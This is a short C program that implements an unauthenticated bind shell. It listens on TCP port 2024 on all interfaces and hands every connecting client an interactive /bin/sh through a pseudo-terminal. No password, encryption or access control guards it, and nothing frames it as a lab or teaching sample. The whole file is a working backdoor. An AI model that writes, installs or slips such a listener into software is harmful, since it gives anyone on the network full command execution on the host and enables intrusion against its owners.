#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pty.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 2024

void handle_client(int client_socket) {
    int master_fd, pid;
    
    // Open a PTY
    pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (pid == 0) {
        // Child process: Start a shell in interactive mode
        execl("/bin/sh", "sh", NULL);
    } else {
        // Parent process: Relay between client and PTY
        char buffer[1024];
        ssize_t bytes;
        while (1) {
            // Check for data from client
            fd_set read_fds;
            FD_ZERO(&read_fds);
            FD_SET(client_socket, &read_fds);
            FD_SET(master_fd, &read_fds);
            
            select(master_fd + 1, &read_fds, NULL, NULL, NULL);
            
            if (FD_ISSET(client_socket, &read_fds)) {
                bytes = recv(client_socket, buffer, sizeof(buffer), 0);
                if (bytes <= 0) break; // Client disconnected or error
                write(master_fd, buffer, bytes); // Write to shell
            }

            if (FD_ISSET(master_fd, &read_fds)) {
                bytes = read(master_fd, buffer, sizeof(buffer));
                if (bytes <= 0) break; // Shell terminated or error
                send(client_socket, buffer, bytes, 0); // Send to client
            }
        }
    }

    // Cleanup
    close(master_fd);
    close(client_socket);
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t sin_len = sizeof(client_addr);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        close(server_socket);
        exit(1);
    }

    listen(server_socket, 1);
    printf("Listening on port %d...\n", PORT);

    while (1) {
        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &sin_len);
        if (client_socket == -1) {
            perror("accept");
            continue;
        }

        printf("Got connection...\n");

        handle_client(client_socket);
    }

    return 0;
}


